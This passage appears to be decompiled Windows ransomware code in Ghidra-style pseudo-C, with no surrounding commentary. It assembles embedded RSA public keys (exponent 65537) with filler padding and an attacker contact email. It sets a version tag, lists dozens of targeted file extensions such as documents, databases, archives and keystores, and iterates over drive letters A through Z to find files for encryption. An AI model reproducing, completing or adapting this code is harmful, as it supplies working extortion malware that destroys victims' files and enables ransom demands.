               "97932057208863804097317380182557626120092371160971366025152017122881832224591456521412041436352424715545408606242333615724802894715060374899930748348693104568782083465816005355018530243731351021765414"
              );
  FUN_00404a70((int *)&DAT_00443384,
               (undefined4 *)
               "1746100718072807:65537|||13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G1"
              );
  FUN_00404a70((int *)&DAT_00443384,
               (undefined4 *)
               "G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G1"
              );
  FUN_00404a70((int *)&DAT_00443384,
               (undefined4 *)
               "G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G1"
              );
  FUN_00404a70((int *)&DAT_00443384,
               (undefined4 *)
               "G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G1"
              );
  FUN_00404a70((int *)&DAT_00443384,
               (undefined4 *)
               "G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G1"
              );
  FUN_00404a70((int *)&DAT_00443384,
               (undefined4 *)
               "G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G1"
              );
  FUN_00404a70((int *)&DAT_00443384,
               (undefined4 *)
               "G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G1"
              );
  FUN_00404a70((int *)&DAT_00443384,
               (undefined4 *)
               "G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110"
              );
  FUN_00404a70((int *)&DAT_00443384,
               (undefined4 *)
               "G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111"
              );
  FUN_00404a70((int *)&DAT_00443384,
               (undefined4 *)
               "G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112"
              );
  FUN_00404a70((int *)&DAT_00443384,
               (undefined4 *)
               "G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113"
              );
  FUN_00404a70((int *)&DAT_00443384,
               (undefined4 *)
               "G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114"
              );
  FUN_00404a70((int *)&DAT_00443384,
               (undefined4 *)
               "G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115"
              );
  FUN_00404a70((int *)&DAT_00443384,
               (undefined4 *)
               "G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116"
              );
  FUN_00404a70((int *)&DAT_00443384,
               (undefined4 *)
               "G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117"
              );
  FUN_00404a70((int *)&DAT_00443384,
               (undefined4 *)
               "G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118"
              );
  FUN_00404a70((int *)&DAT_00443384,
               (undefined4 *)
               "G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119"
              );
  FUN_00404a70((int *)&DAT_00443384,
               (undefined4 *)
               "G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120"
              );
  piVar9 = (int *)&DAT_00443384;
  pcVar3 = FUN_00404d50("|||",DAT_00443384);
  FUN_00404cc8((int)DAT_00443384,1,(uint)(pcVar3 + -1),piVar9);
  FUN_004047fc((int *)&DAT_00443388,
               (undefined4 *)
               "43720500143653067316653188766440495762372951459803254704332449380648781636144602657723600306416673181918633158563712416544618578249307294895202624079580191874460024499933472381883027218220456554995247"
              );
  FUN_00404a70((int *)&DAT_00443388,
               (undefined4 *)
               "65158281214745718421265965989442504562394836294548216033955590900254939392369170497228950606445248805833582659669548453902496538789520516235779898350051755771122652473634583693017585978107350613046507"
              );
  FUN_00404a70((int *)&DAT_00443388,
               (undefined4 *)
               "46286697306922310714255768031863446183870422616732285912784282786501377105470022873925357301968061494307039417299358802372691417937010589796477887985234705396188080181574217253421725831596987526612984"
              );
  FUN_00404a70((int *)&DAT_00443388,
               (undefined4 *)
               "119150272153433:65537|||G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G23G2"
              );
  FUN_00404a70((int *)&DAT_00443388,
               (undefined4 *)
               "G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G24G2"
              );
  FUN_00404a70((int *)&DAT_00443388,
               (undefined4 *)
               "G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G25G2"
              );
  FUN_00404a70((int *)&DAT_00443388,
               (undefined4 *)
               "G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G26G2"
              );
  FUN_00404a70((int *)&DAT_00443388,
               (undefined4 *)
               "G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G27G2"
              );
  FUN_00404a70((int *)&DAT_00443388,
               (undefined4 *)
               "G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G28G2"
              );
  FUN_00404a70((int *)&DAT_00443388,
               (undefined4 *)
               "G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G29G2"
              );
  FUN_00404a70((int *)&DAT_00443388,
               (undefined4 *)
               "G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210G210"
              );
  FUN_00404a70((int *)&DAT_00443388,
               (undefined4 *)
               "G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211G211"
              );
  FUN_00404a70((int *)&DAT_00443388,
               (undefined4 *)
               "G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212G212"
              );
  FUN_00404a70((int *)&DAT_00443388,
               (undefined4 *)
               "G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213G213"
              );
  FUN_00404a70((int *)&DAT_00443388,
               (undefined4 *)
               "G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214G214"
              );
  FUN_00404a70((int *)&DAT_00443388,
               (undefined4 *)
               "G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215G215"
              );
  FUN_00404a70((int *)&DAT_00443388,
               (undefined4 *)
               "G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216G216"
              );
  FUN_00404a70((int *)&DAT_00443388,
               (undefined4 *)
               "G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217G217"
              );
  FUN_00404a70((int *)&DAT_00443388,
               (undefined4 *)
               "G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218G218"
              );
  FUN_00404a70((int *)&DAT_00443388,
               (undefined4 *)
               "G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219G219"
              );
  FUN_00404a70((int *)&DAT_00443388,
               (undefined4 *)
               "G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220G220"
              );
  piVar9 = (int *)&DAT_00443388;
  pcVar3 = FUN_00404d50("|||",DAT_00443388);
  FUN_00404cc8((int)DAT_00443388,1,(uint)(pcVar3 + -1),piVar9);
  FUN_004047fc((int *)&DAT_0044338c,
               (undefined4 *)
               "11260480087583103155720837296732476647502177064403103842104256292705175166816541194018214416526728592250885693346405631902078278799322170358825905256814075226004951445616760965330764671293592279229722"
              );
  FUN_00404a70((int *)&DAT_0044338c,
               (undefined4 *)
               "22160196743305607106649317796986454753459601233200635881921575473627110125132446168309888011818714113680056574527396080037359532723152575957056539345287927867505218040809140490765656786310534017742779"
              );
  FUN_00404a70((int *)&DAT_0044338c,
               (undefined4 *)
               "31993947586429667718985223045665309095957294692309771103410629132017241288155296515121849066713729856729622717014843950401338964253270073202610108437398060580983586681730173787303218300227076813109038"
              );
  FUN_00404a70((int *)&DAT_0044338c,
               (undefined4 *)
               "28104524796878143:65537|||3G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G33G3"
              );
  FUN_00404a70((int *)&DAT_0044338c,
               (undefined4 *)
               "G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G34G3"
              );
  FUN_00404a70((int *)&DAT_0044338c,
               (undefined4 *)
               "G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G35G3"
              );
  FUN_00404a70((int *)&DAT_0044338c,
               (undefined4 *)
               "G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G36G3"
              );
  FUN_00404a70((int *)&DAT_0044338c,
               (undefined4 *)
               "G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G37G3"
              );
  FUN_00404a70((int *)&DAT_0044338c,
               (undefined4 *)
               "G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G38G3"
              );
  FUN_00404a70((int *)&DAT_0044338c,
               (undefined4 *)
               "G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G39G3"
              );
  FUN_00404a70((int *)&DAT_0044338c,
               (undefined4 *)
               "G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310G310"
              );
  FUN_00404a70((int *)&DAT_0044338c,
               (undefined4 *)
               "G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311G311"
              );
  FUN_00404a70((int *)&DAT_0044338c,
               (undefined4 *)
               "G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312G312"
              );
  FUN_00404a70((int *)&DAT_0044338c,
               (undefined4 *)
               "G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313G313"
              );
  FUN_00404a70((int *)&DAT_0044338c,
               (undefined4 *)
               "G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314G314"
              );
  FUN_00404a70((int *)&DAT_0044338c,
               (undefined4 *)
               "G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315G315"
              );
  FUN_00404a70((int *)&DAT_0044338c,
               (undefined4 *)
               "G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316G316"
              );
  FUN_00404a70((int *)&DAT_0044338c,
               (undefined4 *)
               "G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317G317"
              );
  FUN_00404a70((int *)&DAT_0044338c,
               (undefined4 *)
               "G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318G318"
              );
  FUN_00404a70((int *)&DAT_0044338c,
               (undefined4 *)
               "G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319G319"
              );
  FUN_00404a70((int *)&DAT_0044338c,
               (undefined4 *)
               "G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320G320"
              );
  piVar9 = (int *)&DAT_0044338c;
  pcVar3 = FUN_00404d50("|||",DAT_0044338c);
  FUN_00404cc8((int)DAT_0044338c,1,(uint)(pcVar3 + -1),piVar9);
  FUN_004047fc((int *)&DAT_0044337c,
               (undefined4 *)
               "Johnmen.24@aol.com|||KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK"
              );
  piVar9 = (int *)&DAT_0044337c;
  pcVar3 = FUN_00404d50("|||",DAT_0044337c);
  FUN_00404cc8((int)DAT_0044337c,1,(uint)(pcVar3 + -1),piVar9);
  FUN_00409bb0();
  local_34 = (undefined *)0x43a990;
  FUN_0040a7e8((int *)&stack0xffffffe8,extraout_EDX,extraout_ECX,SUB84((double)in_ST0,0),
               (int)((ulonglong)(double)in_ST0 >> 0x20));
  FUN_004047fc((int *)&DAT_00442c3c,unaff_ESI);
  FUN_004047fc(&DAT_00442960,(undefined4 *)"CL 1.2.0.0");
  FUN_004047a8((int *)&DAT_0044295c);
  FUN_00438f34();
  FUN_0043637c();
  piVar9 = (int *)&stack0xffffffe4;
  pcVar3 = FUN_00404d50(":",DAT_00442954);
  pcVar3 = pcVar3 + 1;
  local_34 = (undefined *)0x43a9e0;
  uVar4 = FUN_00404a68((int)DAT_00442954);
  FUN_00404cc8((int)DAT_00442954,(int)pcVar3,uVar4,piVar9);
  FUN_00415c1c(unaff_EDI,&DAT_00442f6c);
  ppbVar10 = &local_20;
  pcVar3 = FUN_00404d50(":",DAT_00442954);
  FUN_00404cc8((int)DAT_00442954,1,(uint)(pcVar3 + -1),(int *)ppbVar10);
  FUN_00415c1c(local_20,&DAT_00442f74);
  iVar6 = 1;
  puVar5 = &DAT_00442f7c;
  do {
    *puVar5 = 0;
    iVar6 = iVar6 + 1;
    puVar5 = puVar5 + 1;
    uVar7 = iVar6 == 0x401;
  } while (!(bool)uVar7);
  FUN_00436a94();
  FUN_00439f88(&local_24);
  FUN_004047fc(&DAT_00443390,local_24);
  FUN_00404bb4(DAT_0044295c,(uint *)"endend");
  if (!(bool)uVar7) {
    FUN_004373b0();
    FUN_004047fc((int *)&DAT_00442f60,
                 (undefined4 *)
                 "r3d:rwl:rx2:p12:sbs:sldasm:wps:sldprt:odc:odb:old:nbd:nx1:nrw:orf:ppt:mov:mpeg:csv:mdb:cer:arj:ods:mkv:avi:odt:pdf:docx:gzip:m2v:cpt:raw:cdr:cdx:1cd:3gp:7z:rar:db3:zip:xlsx:xls:rtf:doc:jpeg:jpg:{}{}{}"
                );
    piVar9 = (int *)&DAT_00442f60;
    pcVar3 = FUN_00404d50("{}{}{}",DAT_00442f60);
    FUN_00404cc8((int)DAT_00442f60,1,(uint)(pcVar3 + -1),piVar9);
    DAT_00442f68 = 0;
    while( true ) {
      pcVar3 = FUN_00404d50(":",DAT_00442f60);
      uVar4 = DAT_00442f68;
      if (pcVar3 == (char *)0x0) break;
      uVar1 = DAT_00442f68 + 1;
      bVar2 = 199 < DAT_00442f68;
      DAT_00442f68 = uVar1;
      if (bVar2) {
        uVar4 = thunk_FUN_004027b0(uVar4);
      }
      piVar9 = (int *)(&DAT_00442c3c + (uVar4 + 1) * 4);
      pcVar3 = FUN_00404d50(":",DAT_00442f60);
      FUN_00404cc8((int)DAT_00442f60,1,(uint)(pcVar3 + -1),piVar9);
      piVar9 = (int *)&DAT_00442f60;
      pcVar3 = FUN_00404d50(":",DAT_00442f60);
      pcVar3 = pcVar3 + 1;
      local_34 = (undefined *)0x43ab11;
      uVar4 = FUN_00404a68((int)DAT_00442f60);
      FUN_00404cc8((int)DAT_00442f60,(int)pcVar3,uVar4,piVar9);
    }
    FUN_004047fc((int *)&DAT_00442f64,
                 (undefined4 *)
                 "psd:zip:ert:bak:xml:cf:mdf:fil:spr:accdb:abf:a3d:asm:fbx:fbw:fbk:fdb:fbf:max:m3d:dbf:ldf:keystore:iv2i:gbk:gho:sn1:sna:spf:sr2:srf:srw:tis:tbl:x3f:ods:pef:pptm:txt:pst:ptx:pz3:mp3:odp:qic:wps:{}{}{}UU"
                );
    piVar9 = (int *)&DAT_00442f64;
    pcVar3 = FUN_00404d50("{}{}{}",DAT_00442f64);
    FUN_00404cc8((int)DAT_00442f64,1,(uint)(pcVar3 + -1),piVar9);
    while( true ) {
      pcVar3 = FUN_00404d50(":",DAT_00442f64);
      uVar4 = DAT_00442f68;
      if (pcVar3 == (char *)0x0) break;
      uVar1 = DAT_00442f68 + 1;
      bVar2 = 199 < DAT_00442f68;
      DAT_00442f68 = uVar1;
      if (bVar2) {
        uVar4 = thunk_FUN_004027b0(uVar4);
      }
      piVar9 = (int *)(&DAT_00442c3c + (uVar4 + 1) * 4);
      pcVar3 = FUN_00404d50(":",DAT_00442f64);
      FUN_00404cc8((int)DAT_00442f64,1,(uint)(pcVar3 + -1),piVar9);
      piVar9 = (int *)&DAT_00442f64;
      pcVar3 = FUN_00404d50(":",DAT_00442f64);
      pcVar3 = pcVar3 + 1;
      local_34 = (undefined *)0x43abc7;
      uVar4 = FUN_00404a68((int)DAT_00442f64);
      FUN_00404cc8((int)DAT_00442f64,(int)pcVar3,uVar4,piVar9);
    }
    local_34 = (undefined *)0x43abf3;
    GetWindowsDirectoryA((LPSTR)&DAT_00442b3c,0xff);
    iVar6 = 0;
    uVar7 = true;
    do {
      puVar5 = (undefined *)0x43ac00;
      FUN_00404990((int *)&stack0xffffffd4,iVar6 + 0x41);
      FUN_00407ee4(puVar5,(LPSTR *)&local_28);
      puVar11 = local_28;
      FUN_00404990((int *)&local_34,extraout_EDX_00 & 0xffffff00 | (uint)DAT_00442b3c);
      puVar8 = (uint *)0x43ac24;
      FUN_00407ee4(local_34,(LPSTR *)&stack0xffffffd0);
      FUN_00404bb4(puVar11,puVar8);
      uVar4 = extraout_EDX_01;
      if (!(bool)uVar7) {
        FUN_00404990((int *)&local_38,iVar6 + 0x41);
        FUN_00404a70((int *)&local_38,(undefined4 *)&DAT_0043e4f8);
        FUN_004386f0(local_38);
        uVar4 = extraout_EDX_02;
      }
      iVar6 = iVar6 + 1;
      uVar7 = iVar6 == 0x1a;
    } while (!(bool)uVar7);
    FUN_00404990((int *)&local_3c,uVar4 & 0xffffff00 | (uint)DAT_00442b3c);
    FUN_00404a70((int *)&local_3c,(undefined4 *)&DAT_0043e4f8);
    FUN_004386f0(local_3c);
    FUN_00404ab4((int *)&local_40,DAT_00442964,DAT_0044296c);
    FUN_00402d24((undefined4 *)&DAT_00442970,local_40);
    FUN_00402ab4(&DAT_00442970);
    FUN_004027bc();
    FUN_00402ac0(&DAT_00442970);
    FUN_004027bc();
    puVar5 = (undefined *)FUN_00404dfc(&DAT_00442970,"BCDLID");
    FUN_0040360c(puVar5,extraout_EDX_03,extraout_ECX_00);
    FUN_004027bc();
    puVar5 = (undefined *)FUN_00404dfc(&DAT_00442970,"endend");
    FUN_0040360c(puVar5,extraout_EDX_04,extraout_ECX_01);
    FUN_004027bc();
    puVar5 = (undefined *)FUN_00404dfc(&DAT_00442970,(undefined *)DAT_0044295c);
    FUN_0040360c(puVar5,extraout_EDX_05,extraout_ECX_02);
    FUN_004027bc();
    FUN_00402ec8(&DAT_00442970);
    FUN_004027bc();
  }
  FUN_00437ff4();
  *in_FS_OFFSET = local_28;
  local_20 = &DAT_0043ad20;
  local_24 = (int *)0x43ad18;
  FUN_004047cc((int *)&local_40,0xb);
  return;
}


